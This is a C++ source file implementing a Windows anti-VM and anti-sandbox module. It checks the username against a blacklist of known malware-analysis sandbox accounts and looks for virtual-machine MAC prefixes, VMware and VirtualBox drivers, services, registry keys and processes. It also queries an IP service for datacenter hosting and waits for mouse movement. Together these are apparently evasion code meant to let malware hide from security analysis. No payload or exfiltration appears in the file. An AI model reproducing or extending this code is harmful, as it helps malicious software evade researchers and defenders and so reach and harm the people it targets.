#include "antivm.h"
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cctype>


typedef BOOL(WINAPI* pGetUserNameA_t)(LPSTR, LPDWORD);
typedef DWORD(WINAPI* pGetFileAttributesA_t)(LPCSTR);
typedef LONG(WINAPI* pRegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI* pRegCloseKey_t)(HKEY);
typedef SC_HANDLE(WINAPI* pOpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
typedef SC_HANDLE(WINAPI* pOpenServiceA_t)(SC_HANDLE, LPCSTR, DWORD);
typedef BOOL(WINAPI* pCloseServiceHandle_t)(SC_HANDLE);
typedef HANDLE(WINAPI* pCreateToolhelp32Snapshot_t)(DWORD, DWORD);
typedef BOOL(WINAPI* pProcess32FirstW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pProcess32NextW_t)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* pCloseHandle_t)(HANDLE);
typedef DWORD(WINAPI* pGetAdaptersInfo_t)(PIP_ADAPTER_INFO, PULONG);
typedef HINTERNET(WINAPI* pWinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* pWinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI* pWinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI* pWinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* pWinHttpReceiveResponse_t)(HINTERNET, LPVOID);
typedef BOOL(WINAPI* pWinHttpQueryDataAvailable_t)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI* pWinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* pWinHttpCloseHandle_t)(HINTERNET);
typedef BOOL(WINAPI* pGetCursorPos_t)(LPPOINT);
typedef void(WINAPI* pSleep_t)(DWORD);
typedef DWORD(WINAPI* pGetTickCount_t)();

namespace AntiVM {

// VM MAC address list
const std::vector<std::string> vmMacList = {
    "00:0c:29", "00:50:56",
    "08:00:27", "52:54:00",
    "00:21:F6", "00:14:4F",
    "00:0F:4B", "00:10:E0",
    "00:00:7D", "00:21:28",
    "00:01:5D", "00:A0:A4",
    "00:07:82", "00:03:BA",
    "08:00:20", "2C:C2:60",
    "00:10:4F", "00:13:97",
    "00:20:F2"
};

// Blacklisted usernames
const std::vector<std::string> usernameBlacklist = {
    "billy", "george",
    "abby", "darrel jones",
    "john", "john zalinsk",
    "john doe", "shctaga3rm",
    "uv0u6479bogy", "8wjxnbz",
    "walker", "oxyt3lzggzmk",
    "t3wobowwaw", "uh6pn",
    "smdvvcp", "06aay3",
    "mlfanllp", "jpqlavkfb0lt0",
    "7hv8but5biscz", "afgxgd9fq4iv8",
    "frank", "anna",
    "wdagutilityaccount", "hal9th",
    "virus", "malware",
    "sandbox", "sample",
    "currentuser", "emily",
    "hapubws", "hong lee",
    "jaakw.q", "it-admin",
    "johnson", "miller",
    "milozs", "microsoft",
    "sand box", "maltest"
};

// Helper function to convert string to lowercase
std::string ToLower(const std::string& str) {
    std::string lower = str;
    std::transform(lower.begin(), lower.end(), lower.begin(),
        [](unsigned char c) { return std::tolower(c); });
    return lower;
}

// Get current username
std::string GetUsername() {
    pGetUserNameA_t _GetUserNameA = (pGetUserNameA_t)GetUserNameA;
    if (!_GetUserNameA) return "";
    char username[256];
    DWORD size = sizeof(username);
    if (_GetUserNameA(username, &size)) {
        return std::string(username);
    }
    return "";
}

// Check if file exists
bool FileExists(const std::string& path) {
    pGetFileAttributesA_t _GetFileAttributesA = (pGetFileAttributesA_t)GetFileAttributesA;
    if (!_GetFileAttributesA) return false;
    DWORD attrs = _GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
}

// Check if directory exists
bool DirectoryExists(const std::string& path) {
    pGetFileAttributesA_t _GetFileAttributesA = (pGetFileAttributesA_t)GetFileAttributesA;
    if (!_GetFileAttributesA) return false;
    DWORD attrs = _GetFileAttributesA(path.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
}

// Check if registry key exists
bool CheckRegistryKey(const std::string& keyPath) {
    pRegOpenKeyExA_t _RegOpenKeyExA = (pRegOpenKeyExA_t)RegOpenKeyExA;
    pRegCloseKey_t _RegCloseKey = (pRegCloseKey_t)RegCloseKey;
    if (!_RegOpenKeyExA || !_RegCloseKey) return false;

    HKEY hKey;
    size_t pos = keyPath.find('\\');
    if (pos == std::string::npos) return false;

    std::string rootKey = keyPath.substr(0, pos);
    std::string subKey = keyPath.substr(pos + 1);

    HKEY root = HKEY_LOCAL_MACHINE;
    if (rootKey == "HKEY_LOCAL_MACHINE" || rootKey == "HKLM") {
        root = HKEY_LOCAL_MACHINE;
    } else if (rootKey == "HKEY_CURRENT_USER" || rootKey == "HKCU") {
        root = HKEY_CURRENT_USER;
    }

    LONG result = _RegOpenKeyExA(root, subKey.c_str(), 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        _RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Check if a Windows service exists
bool CheckServiceExists(const std::string& serviceName) {
    pOpenSCManagerA_t _OpenSCManagerA = (pOpenSCManagerA_t)OpenSCManagerA;
    pOpenServiceA_t _OpenServiceA = (pOpenServiceA_t)OpenServiceA;
    pCloseServiceHandle_t _CloseServiceHandle = (pCloseServiceHandle_t)CloseServiceHandle;
    if (!_OpenSCManagerA || !_OpenServiceA || !_CloseServiceHandle) return false;

    SC_HANDLE scManager = _OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scManager) return false;

    SC_HANDLE service = _OpenServiceA(scManager, serviceName.c_str(), SERVICE_QUERY_STATUS);
    bool exists = (service != NULL);

    if (service) _CloseServiceHandle(service);
    _CloseServiceHandle(scManager);

    return exists;
}

// Check if a process is running
bool CheckProcessRunning(const std::string& processName) {
    pCreateToolhelp32Snapshot_t _CreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot_t)CreateToolhelp32Snapshot;
    pProcess32FirstW_t _Process32FirstW = (pProcess32FirstW_t)Process32FirstW;
    pProcess32NextW_t _Process32NextW = (pProcess32NextW_t)Process32NextW;
    pCloseHandle_t _CloseHandle = (pCloseHandle_t)CloseHandle;
    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || !_CloseHandle) return false;

    HANDLE snapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    std::string lowerProcessName = ToLower(processName);

    if (_Process32FirstW(snapshot, &processEntry)) {
        do {
            std::wstring wideExeFile(processEntry.szExeFile);
            std::string exeFile = ToLower(std::string(wideExeFile.begin(), wideExeFile.end()));
            if (exeFile.find(lowerProcessName) != std::string::npos) {
                _CloseHandle(snapshot);
                return true;
            }
        } while (_Process32NextW(snapshot, &processEntry));
    }

    _CloseHandle(snapshot);
    return false;
}

// DetectVM - Main detection function
std::pair<bool, std::string> DetectVM() {
    // Check username blacklist
    std::string username = GetUsername();
    if (CheckUsernameBlacklist(username)) {
        return std::make_pair(true, "Blacklisted username: " + username);
    }

    // Check MAC addresses
    auto macResult = CheckMacAddress();
    if (macResult.second) {
        return std::make_pair(true, "Suspicious MAC address: " + macResult.first);
    }

    // Check for VMware
    if (DetectVMwareWindows()) {
        return std::make_pair(true, "VMware detected");
    }

    // Check for VirtualBox
    if (DetectVirtualBoxWindows()) {
        return std::make_pair(true, "VirtualBox detected");
    }

    // Check for datacenter/hosting provider
    if (DetectHostingProvider()) {
        return std::make_pair(true, "Hosting provider detected");
    }

    // Check for mouse movement (sandboxes typically have no user input)
    if (CheckMouseMovement()) {
        return std::make_pair(true, "No mouse movement detected");
    }

    return std::make_pair(false, "No VM detected");
}

// DetectVMwareWindows
bool DetectVMwareWindows() {
    // Check for VMware driver
    if (FileExists("C:\\Windows\\System32\\drivers\\vmci.sys")) {
        return true;
    }

    // Check for VMware Tools service
    if (CheckServiceExists("VMTools")) {
        return true;
    }

    // Check for VMware registry entry
    if (CheckRegistryKey("HKEY_LOCAL_MACHINE\\Software\\VMware, Inc.")) {
        return true;
    }

    // Check for VMware specific files
    std::vector<std::string> vmwareFiles = {
        "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe",
        "C:\\Program Files (x86)\\VMware\\VMware Tools\\vmtoolsd.exe"
    };

    for (const auto& file : vmwareFiles) {
        if (FileExists(file)) {
            return true;
        }
    }

    return false;
}

// DetectVirtualBoxWindows
bool DetectVirtualBoxWindows() {
    // Check for VirtualBox driver
    if (FileExists("C:\\Windows\\System32\\drivers\\VBoxMouse.sys")) {
        return true;
    }

    // Check for VirtualBox registry entry
    if (CheckRegistryKey("HKEY_LOCAL_MACHINE\\Software\\Oracle\\VirtualBox")) {
        return true;
    }

    // Check for VirtualBox specific directories
    std::vector<std::string> vboxDirs = {
        "C:\\Program Files\\Oracle\\VirtualBox",
        "C:\\Program Files (x86)\\Oracle\\VirtualBox"
    };

    for (const auto& dir : vboxDirs) {
        if (DirectoryExists(dir)) {
            return true;
        }
    }

    // Check for VirtualBox process
    if (CheckProcessRunning("VBoxTray.exe")) {
        return true;
    }

    return false;
}

// CheckUsernameBlacklist
bool CheckUsernameBlacklist(const std::string& username) {
    std::string usernameLower = ToLower(username);

    for (const auto& blacklistedName : usernameBlacklist) {
        if (usernameLower.find(blacklistedName) != std::string::npos) {
            return true;
        }
    }

    return false;
}

// CheckMacAddress
std::pair<std::string, bool> CheckMacAddress() {
    pGetAdaptersInfo_t _GetAdaptersInfo = (pGetAdaptersInfo_t)GetAdaptersInfo;
    if (!_GetAdaptersInfo) return std::make_pair("", false);

    ULONG bufferSize = 15000;
    PIP_ADAPTER_INFO adapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
    
    if (adapterInfo == NULL) {
        return std::make_pair("", false);
    }

    if (_GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
        free(adapterInfo);
        adapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
        if (adapterInfo == NULL) {
            return std::make_pair("", false);
        }
    }

    if (_GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        PIP_ADAPTER_INFO adapter = adapterInfo;
        
        while (adapter) {
            // Skip loopback
            if (adapter->Type == MIB_IF_TYPE_LOOPBACK) {
                adapter = adapter->Next;
                continue;
            }

            // Format MAC address
            std::ostringstream macStream;
            for (UINT i = 0; i < adapter->AddressLength; i++) {
                if (i > 0) macStream << ":";
                macStream << std::hex << std::setfill('0') << std::setw(2) 
                         << (int)adapter->Address[i];
            }

            std::string mac = macStream.str();
            if (mac.length() >= 8) {
                std::string macPrefix = ToLower(mac.substr(0, 8));
                
                for (const auto& vmMac : vmMacList) {
                    std::string vmMacLower = ToLower(vmMac);
                    if (macPrefix.find(vmMacLower) == 0) {
                        free(adapterInfo);
                        return std::make_pair(mac, true);
                    }
                }
            }

            adapter = adapter->Next;
        }
    }

    free(adapterInfo);
    return std::make_pair("", false);
}

// FetchIPFromService
std::string FetchIPFromService(const std::string& url) {
    pWinHttpOpen_t _WinHttpOpen = (pWinHttpOpen_t)WinHttpOpen;
    pWinHttpConnect_t _WinHttpConnect = (pWinHttpConnect_t)WinHttpConnect;
    pWinHttpOpenRequest_t _WinHttpOpenRequest = (pWinHttpOpenRequest_t)WinHttpOpenRequest;
    pWinHttpSendRequest_t _WinHttpSendRequest = (pWinHttpSendRequest_t)WinHttpSendRequest;
    pWinHttpReceiveResponse_t _WinHttpReceiveResponse = (pWinHttpReceiveResponse_t)WinHttpReceiveResponse;
    pWinHttpQueryDataAvailable_t _WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable_t)WinHttpQueryDataAvailable;
    pWinHttpReadData_t _WinHttpReadData = (pWinHttpReadData_t)WinHttpReadData;
    pWinHttpCloseHandle_t _WinHttpCloseHandle = (pWinHttpCloseHandle_t)WinHttpCloseHandle;
    if (!_WinHttpOpen || !_WinHttpConnect || !_WinHttpOpenRequest ||
        !_WinHttpSendRequest || !_WinHttpReceiveResponse ||
        !_WinHttpQueryDataAvailable || !_WinHttpReadData || !_WinHttpCloseHandle) return "";

    std::string result;

    // Parse URL manually
    std::string scheme, hostName, urlPath;
    bool useSSL = false;
    WORD port = 80;

    size_t schemeEnd = url.find("://");
    if (schemeEnd == std::string::npos) {
        return "";
    }

    scheme = url.substr(0, schemeEnd);
    useSSL = (scheme == "https");
    port = useSSL ? 443 : 80;

    size_t hostStart = schemeEnd + 3;
    size_t pathStart = url.find('/', hostStart);

    if (pathStart == std::string::npos) {
        hostName = url.substr(hostStart);
        urlPath = "/";
    } else {
        hostName = url.substr(hostStart, pathStart - hostStart);
        urlPath = url.substr(pathStart);
    }

    std::string _uaNarrow = "AntiVM/1.0";
    std::wstring wUserAgent(_uaNarrow.begin(), _uaNarrow.end());
    HINTERNET hSession = _WinHttpOpen(wUserAgent.c_str(),
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME,
                                      WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    std::wstring wHostName(hostName.begin(), hostName.end());
    HINTERNET hConnect = _WinHttpConnect(hSession, wHostName.c_str(),
                                         port, 0);
    if (!hConnect) {
        _WinHttpCloseHandle(hSession);
        return "";
    }

    std::wstring wUrlPath(urlPath.begin(), urlPath.end());
    std::string _getNarrow = "GET";
    std::wstring wGET(_getNarrow.begin(), _getNarrow.end());
    DWORD flags = useSSL ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = _WinHttpOpenRequest(hConnect, wGET.c_str(), wUrlPath.c_str(),
                                             NULL, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             flags);
    if (!hRequest) {
        _WinHttpCloseHandle(hConnect);
        _WinHttpCloseHandle(hSession);
        return "";
    }

    if (_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        _WinHttpReceiveResponse(hRequest, NULL)) {

        DWORD bytesAvailable = 0;
        char buffer[1024];
        // Cap the response so a malformed/large "trusted IP" reply cannot grow
        // this string without bound.
        const size_t kMaxTrustedIpResponse = 16 * 1024;

        while (result.size() < kMaxTrustedIpResponse &&
               _WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
            DWORD bytesRead = 0;
            DWORD toRead = bytesAvailable < (sizeof(buffer) - 1) ? bytesAvailable : (sizeof(buffer) - 1);

            if (_WinHttpReadData(hRequest, buffer, toRead, &bytesRead)) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
        }
    }

    _WinHttpCloseHandle(hRequest);
    _WinHttpCloseHandle(hConnect);
    _WinHttpCloseHandle(hSession);

    // Trim whitespace
    result.erase(0, result.find_first_not_of(" \t\n\r"));
    result.erase(result.find_last_not_of(" \t\n\r") + 1);

    return result;
}

// CheckMouseMovement
bool CheckMouseMovement() {
    pGetCursorPos_t _GetCursorPos = (pGetCursorPos_t)GetCursorPos;
    pSleep_t _Sleep = (pSleep_t)Sleep;
    pGetTickCount_t _GetTickCount = (pGetTickCount_t)GetTickCount;
    if (!_GetCursorPos || !_Sleep || !_GetTickCount) return false;

    POINT initialPos;
    _GetCursorPos(&initialPos);

    DWORD startTime = _GetTickCount();
    while (_GetTickCount() - startTime < 5000) {
        _Sleep(100);
        POINT currentPos;
        _GetCursorPos(&currentPos);
        if (currentPos.x != initialPos.x || currentPos.y != initialPos.y) {
            return false;
        }
    }

    return true;
}

// DetectHostingProvider
bool DetectHostingProvider() {
    std::string response = FetchIPFromService("https://api.ipapi.is/");

    if (response.empty()) {
        return false;
    }

    // Simple JSON parsing for "is_datacenter" field
    size_t pos = response.find("\"is_datacenter\"");
    if (pos != std::string::npos) {
        size_t truePos = response.find("true", pos);
        size_t falsePos = response.find("false", pos);

        if (truePos != std::string::npos &&
            (falsePos == std::string::npos || truePos < falsePos)) {
            return true;
        }
    }

    return false;
}

} // namespace AntiVM
